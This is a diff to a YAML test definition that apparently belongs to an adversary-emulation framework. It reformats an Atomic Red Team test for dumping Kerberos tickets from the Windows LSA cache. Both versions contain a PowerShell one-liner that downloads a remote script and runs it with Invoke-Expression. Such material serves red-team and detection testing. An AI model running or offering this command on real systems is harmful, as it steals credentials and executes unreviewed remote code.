@@ -1,4 +1,4 @@
-- id: 7d6961aa-61c1-54f6-b9a4-7e83169b0b2b
+- requirements: []
   name: Soumaia ART Tests - Dump Kerberos Tickets from LSA using dumper.ps1
   description: 'This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.
 
@@ -8,11 +8,14 @@
 
     Author of dumper.ps1: Michael Zhmaylo (@MzHmO) (requires elevation)'
   tactic: credential-access
-  technique:
-    attack_id: T1003.004
-    name: 'OS Credential Dumping: LSA Secrets'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
+  technique_id: T1003.004
+  technique_name: 'OS Credential Dumping: LSA Secrets'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
+  id: 7d6961aa-61c1-54f6-b9a4-7e83169b0b2b
